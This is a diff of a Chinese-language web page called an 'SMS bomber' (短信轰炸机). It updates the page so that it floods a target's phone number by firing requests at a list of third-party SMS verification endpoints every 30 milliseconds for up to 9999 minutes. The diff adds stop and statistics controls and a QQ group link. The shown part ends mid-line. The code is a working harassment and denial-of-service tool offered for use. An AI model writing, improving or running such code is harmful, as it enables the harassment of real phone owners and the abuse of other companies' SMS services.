@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>短信轰炸机 · 持续版</title>
+    <title>短信轰炸机 · 毫秒级持续版</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
@@ -34,6 +34,10 @@
             color: #aaa;
             font-size: 14px;
             margin-bottom: 20px;
+        }
+        .card .sub .highlight {
+            color: #0f0;
+            font-weight: bold;
         }
         .input-group {
             display: flex;
@@ -108,46 +112,86 @@
             opacity: 0.5;
             cursor: not-allowed;
         }
+        .btn-danger {
+            background: #ff3b30;
+        }
+        .btn-danger:hover { background: #d63031; }
         .btn-qq {
             background: #12b7f5;
         }
         .btn-qq:hover { background: #0a8fc2; }
         .btn-qq:active { background: #0873a0; }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
         .status {
             text-align: center;
             font-size: 14px;
             min-height: 24px;
             margin-bottom: 8px;
             color: #6af;
+            line-height: 1.8;
         }
+        .status .stats {
+            color: #fff;
+            font-size: 13px;
+        }
+        .status .stats span {
+            font-weight: bold;
+        }
+        .status .stats .ok { color: #0f0; }
+        .status .stats .fail { color: #f44; }
         .log {
             background: #111;
             border-radius: 6px;
             padding: 10px 12px;
-            height: 200px;
+            height: 160px;
             overflow-y: auto;
             font-family: "Menlo", "Consolas", monospace;
-            font-size: 12px;
+            font-size: 11px;
             color: #0f0;
             white-space: pre-wrap;
             word-break: break-all;
-            line-height: 1.6;
+            line-height: 1.5;
             border: 1px solid #2a2a2a;
             margin-top: 8px;
         }
         .log::-webkit-scrollbar { width: 4px; }
         .log::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
-        .btn-group {
+        .interval-badge {
+            display: inline-block;
+            background: #2a2a2a;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #0f0;
+            margin-top: 4px;
+        }
+        .flex-row {
             display: flex;
-            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
             gap: 8px;
+        }
+        .flex-row .btn {
+            flex: 1;
+            margin-bottom: 0;
+        }
+        .hidden { display: none !important; }
+        .time-display {
+            font-size: 13px;
+            color: #aaa;
+            text-align: center;
+            margin-top: 4px;
         }
     </style>
 </head>
 <body>
 <div class="card">
     <h1>💣 短信轰炸机</h1>
-    <div class="sub">300+ 接口 · 持续轰炸</div>
+    <div class="sub"><span class="highlight">毫秒级</span>持续轰炸</div>
 
     <div class="input-group">
         <input type="password" id="phoneInput" placeholder="手机号" maxlength="11" inputmode="numeric">
@@ -160,12 +204,25 @@
         <span class="hint">1 ~ 9999</span>
     </div>
 
+    <div style="text-align:center;margin-bottom:12px;">
+        <span class="interval-badge">⚡ 轮询间隔：30 毫秒 / 轮</span>
+    </div>
+
     <div class="btn-group">
-        <button class="btn btn-primary" id="sendBtn">开始轰炸</button>
+        <div class="flex-row">
+            <button class="btn btn-primary" id="sendBtn">🚀 开始轰炸</button>
+            <button class="btn btn-danger hidden" id="stopBtn">⛔ 停止</button>
+        </div>
         <button class="btn btn-qq" id="qqBtn">💬 加入QQ群</button>
     </div>
 
-    <div class="status" id="statusLabel">就绪</div>
+    <div class="status" id="statusLabel">
+        <div>就绪</div>
+        <div class="stats" id="statsDisplay">
+            已发送: <span id="totalSent">0</span> &nbsp;|&nbsp; 成功: <span class="ok" id="successCount">0</span> &nbsp;|&nbsp; 失败: <span class="fail" id="failCount">0</span>
+        </div>
+        <div class="time-display" id="timeDisplay">⏱️ 00:00</div>
+    </div>
     <div class="log" id="logArea">[系统] 加载接口中...</div>
 </div>
 
@@ -829,10 +886,9 @@
     ];
 
     // =========================================================================
-    // 2. 核心逻辑
+    // 2. 核心逻辑（真正的毫秒级持续轰炸）
     // =========================================================================
 
-    // 构造完整接口列表
     const apis = [];
     postDicts.forEach(d => {
         apis.push({ url: d.url, method: 'POST', data: d.data, header: d.header || {} });
@@ -879,40 +935,38 @@
         return '';
     }
 
-    // 单个请求发送
-    function sendRequest(api, phone) {
-        return new Promise((resolve) => {
-            let url = interpolate(api.url, phone);
-            const method = api.method.toUpperCase();
-            const headers = { ...api.header };
-            let body = null;
+    // 单个请求发送（fire-and-forget，不阻塞）
+    function sendRequest(api, phone, onComplete) {
+        let url = interpolate(api.url, phone);
+        const method = api.method.toUpperCase();
+        const headers = { ...api.header };
+        let body = null;
 
-            if (method === 'POST') {
-                const rawData = typeof api.data === 'string'
-                    ? interpolate(api.data, phone)
-                    : api.data;
-                body = buildBody(rawData, headers);
-                headers['Content-Type'] = 'application/x-www-form-urlencoded';
-            } else if (method === 'GET') {
-                if (api.data && typeof api.data === 'object') {
-                    const params = new URLSearchParams(api.data);
-                    const query = params.toString();
-                    if (query) url += (url.includes('?') ? '&' : '?') + query;
-                }
+        if (method === 'POST') {
+            const rawData = typeof api.data === 'string'
+                ? interpolate(api.data, phone)
+                : api.data;
+            body = buildBody(rawData, headers);
+            headers['Content-Type'] = 'application/x-www-form-urlencoded';
+        } else if (method === 'GET') {
+            if (api.data && typeof api.data === 'object') {
+                const params = new URLSearchParams(api.data);
+                const query = params.toString();
+                if (query) url += (url.includes('?') ? '&' : '?') + query;
             }
+        }
 
-            fetch(url, {
-                method: method,
-                headers: headers,
-                body: body,
-                mode: 'cors',
-            })
-            .then(res => {
-                resolve({ success: res.status >= 200 && res.status < 300, status: res.status });
-            })
-            .catch(() => {
-                resolve({ success: false, status: -1 });
-            });
+        fetch(url, {
+            method: method,
+            headers: headers,
+            body: body,
+            mode: 'cors',
+        })
+        .then(res => {
+            onComplete(res.status >= 200 && res.status < 300);
+        })
+        .catch(() => {
+            onComplete(false);
         });
     }
 
@@ -924,11 +978,25 @@
     const eyeBtn = document.getElementById('eyeBtn');
     const minutesInput = document.getElementById('minutesInput');
     const sendBtn = document.getElementById('sendBtn');
+    const stopBtn = document.getElementById('stopBtn');
     const statusLabel = document.getElementById('statusLabel');
     const qqBtn = document.getElementById('qqBtn');
     const logArea = document.getElementById('logArea');
+    const totalSentSpan = document.getElementById('totalSent');
+    const successCountSpan = document.getElementById('successCount');
+    const failCountSpan = document.getElementById('failCount');
+    const timeDisplay = document.getElementById('timeDisplay');
 
-    // 显示加载完成
+    // 状态变量
+    let timerId = null;
+    let isRunning = false;
+    let totalSent = 0;
+    let successCount = 0;
+    let failCount = 0;
+    let startTime = null;
+    let endTime = null;
+    let pendingRequests = 0;
+
     appendLog(`🔥 加载接口 ${apis.length} 个`, '');
 
     // 眼睛切换
@@ -951,12 +1019,52 @@
         window.open('https://qm.qq.com/q/5icZm5FoM8', '_blank');
     });
 
-    // 轰炸主逻辑（持续分钟）
-    sendBtn.addEventListener('click', async () => {
+    // 更新UI统计
+    function updateStats() {
+        totalSentSpan.textContent = totalSent;
+        successCountSpan.textContent = successCount;
+        failCountSpan.textContent = failCount;
+    }
+
+    // 更新时间显示
+    function updateTime() {
+        if (!startTime) return;
+        const elapsed = Math.floor((Date.now() - startTime) / 1000);
+        const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+        const s = String(elapsed % 60).padStart(2, '0');
+        timeDisplay.textContent = `⏱️ ${m}:${s}`;
+    }
+
+    // 停止轰炸
+    function stopBombing() {
+        if (timerId) {
+            clearInterval(timerId);
+            timerId = null;
+        }
+        isRunning = false;
+        sendBtn.classList.remove('hidden');
+        stopBtn.classList.add('hidden');
+        sendBtn.disabled = false;
+        sendBtn.textContent = '🚀 开始轰炸';
+        statusLabel.innerHTML = `
+            <div style="color:#ff0;">⛔ 已停止</div>
+            <div class="stats">
+                已发送: <span id="totalSent">${totalSent}</span> &nbsp;|&nbsp; 成功: <span class="ok" id="successCount">${successCount}</span> &nbsp;|&nbsp; 失败: <span class="fail" id="failCount">${failCount}</span>
+            </div>
+            <div class="time-display" id="timeDisplay">⏱️ ${timeDisplay.textContent}</div>
+        `;
+        // 重新绑定DOM引用（因为innerHTML重建了元素）
+        document.getElementById('totalSent').textContent = totalSent;
+        document.getElementById('successCount').textContent = successCount;
+        document.getElementById('failCount').textContent = failCount;
+        appendLog(`⛔ 已停止，共发送 ${totalSent} 条，成功 ${successCount} 条，失败 ${failCount} 条`, '');
+    }
+
+    // 开始轰炸
+    function startBombing() {
         const phone = phoneInput.value.trim();
         if (!/^1\d{10}$/.test(phone)) {
-            statusLabel.textContent = '❌ 请输入11位手机号';
-            statusLabel.style.color = '#f44';
+            statusLabel.innerHTML = `<div style="color:#f44;">❌ 请输入11位手机号</div>`;
             return;
         }
         let minutes = parseInt(minutesInput.value) || 1;
@@ -964,46 +1072,113 @@
         if (minutes > 9999) minutes = 9999;
         minutesInput.value = minutes;
 
-        // 禁用按钮，防止重复点击
+        // 重置统计
+        totalSent = 0;
+        successCount = 0;
+        failCount = 0;
+        pendingRequests = 0;
+        startTime = Date.now();
+        endTime = startTime + minutes * 60 * 1000;
+
+        // UI切换
+        sendBtn.classList.add('hidden');
+        stopBtn.classList.remove('hidden');
+        stopBtn.disabled = false;
         sendBtn.disabled = true;
-        statusLabel.textContent = `⏳ 持续轰炸中，剩余 ${minutes} 分钟...`;
-        statusLabel.style.color = '#6af';
+
+        statusLabel.innerHTML = `
+            <div style="color:#6af;">🚀 轰炸中... 剩余 ${minutes} 分钟</div>
+            <div class="stats">
+                已发送: <span id="totalSent">0</span> &nbsp;|&nbsp; 成功: <span class="ok" id="successCount">0</span> &nbsp;|&nbsp; 失败: <span class="fail" id="failCount">0</span>
+            </div>
+            <div class="time-display" id="timeDisplay">⏱️ 00:00</div>
+        `;
+
         appendLog(`📱 手机号: ${phone}`, phone);
-        appendLog(`⏱️ 持续 ${minutes} 分钟`, phone);
+        appendLog(`⏱️ 持续 ${minutes} 分钟，间隔 30ms/轮，共 ${apis.length} 个接口`, phone);
 
-        const startTime = Date.now();
-        const endTime = startTime + minutes * 60 * 1000;
-        let successTotal = 0;
-        let failTotal = 0;
+        // 启动定时器，每30ms触发一轮
+        const INTERVAL = 30;
+        let isStopped = false;
 
-        // 循环发送，直到超时
-        while (Date.now() < endTime) {
-            // 计算剩余时间
+        // 停止按钮
+        stopBtn.onclick = function() {
+            if (isStopped) return;
+            isStopped = true;
+            stopBtn.disabled = true;
+            stopBtn.textContent = '⏹ 停止中...';
+            if (timerId) {
+                clearInterval(timerId);
+                timerId = null;
+            }
+            // 等待1秒让正在进行的请求完成
+            setTimeout(() => {
+                isRunning = false;
+                stopBtn.classList.add('hidden');
+                sendBtn.classList.remove('hidden');
+                sendBtn.disabled = false;
+                sendBtn.textContent = '🚀 开始轰炸';
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const s = String(elapsed % 60).padStart(2, '0');
+                statusLabel.innerHTML = `
+                    <div style="color:#ff0;">⛔ 已停止</div>
+                    <div class="stats">
+                        已发送: <span id="totalSent">${totalSent}</span> &nbsp;|&nbsp; 成功: <span class="ok" id="successCount">${successCount}</span> &nbsp;|&nbsp; 失败: <span class="fail" id="failCount">${failCount}</span>
+                    </div>
+                    <div class="time-display" id="timeDisplay">⏱️ ${m}:${s}</div>
+                `;
+                appendLog(`⛔ 已停止，共发送 ${totalSent} 条，成功 ${successCount} 条，失败 ${failCount} 条`, '');
+                isStopped = false;
+                stopBtn.textContent = '⛔ 停止';
+            }, 1000);
+        };
+
+        isRunning = true;
+        isStopped = false;
+
+        timerId = setInterval(() => {
+            // 检查是否超时
+            if (Date.now() >= endTime) {
+                clearInterval(timerId);
+                timerId = null;
+                isRunning = false;
+                stopBtn.classList.add('hidden');
+                sendBtn.classList.remove('hidden');
+                sendBtn.disabled = false;
+                sendBtn.textContent = '🚀 开始轰炸';
+                const elapsed = Math.floor((Date.now() - startTime) / 1000);
+                const m = String(Math.floor(elapsed / 60)).padStart(2, '0');
+                const s = String(elapsed % 60).padStart(2, '0');
+                statusLabel.innerHTML = `
+                    <div style="color:#0f0;">✅ 轰炸完成！</div>
+                    <div class="stats">
+                        已发送: <span id="totalSent">${totalSent}</span> &nbsp;|&nbsp; 成功: <span class="ok" id="successCount">${successCount}</span> &nbsp;|&nbsp; 失败: <span class="fail" id="failCount">${failCount}</span>
+                    </div>
+                    <div class="time-display" id="timeDisplay">⏱️ ${m}:${s}</div>
+                `;
+                appendLog(`✅ 完成！持续 ${elapsed} 秒，发送 ${totalSent} 条，成功 ${successCount} 条，失败 ${failCount} 条`, '');
+                return;
+            }
+
+            // 更新剩余时间显示
             const remaining = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
-            const remainingMin = Math.floor(remaining / 60);
-            const remainingSec = remaining % 60;
-            statusLabel.textContent = `⏳ 持续轰炸中，剩余 ${remainingMin}分${remainingSec}秒...`;
+            const rm = String(Math.floor(remaining / 60)).padStart(2, '0');
+            const rs = String(remaining % 60).padStart(2, '0');
+            const statusDiv = statusLabel.querySelector('div:first-child');
+            if (statusDiv) {
+                statusDiv.textContent = `🚀 轰炸中... 剩余 ${rm}:${rs}`;
+            }
 
-            // 发送一轮所有接口
-            const promises = apis.map(api => sendRequest(api, phone));
-            const results = await Promise.all(promises);
-            results.forEach(res => {
-                if (res.success) successTotal++;
-                else failTotal++;
-            });
+            // 更新时间
+            updateTime();
 
-            // 每轮结束后立即检查时间，如果未结束则继续下一轮
-            // 为防止死循环，若时间已到则退出
-        }
-
-        // 结束统计
-        const elapsed = Math.round((Date.now() - startTime) / 1000);
-        const msg = `✅ 完成！持续 ${elapsed} 秒，成功 ${successTotal} 个，失败 ${failTotal} 个`;
-        statusLabel.textContent = msg;
-        statusLabel.style.color = '#0f0';
-        appendLog(msg, phone);
-        sendBtn.disabled = false;
-    });
-</script>
-</body>
-</html>
+            // 发送一轮所有接口（fire-and-forget）
+            for (const api of apis) {
+                totalSent++;
+                pendingRequests++;
+                sendRequest(api, phone, (ok) => {
+                    pendingRequests--;
+                    if (ok) successCount++;
+                    else failCount++;
+                    updateStats
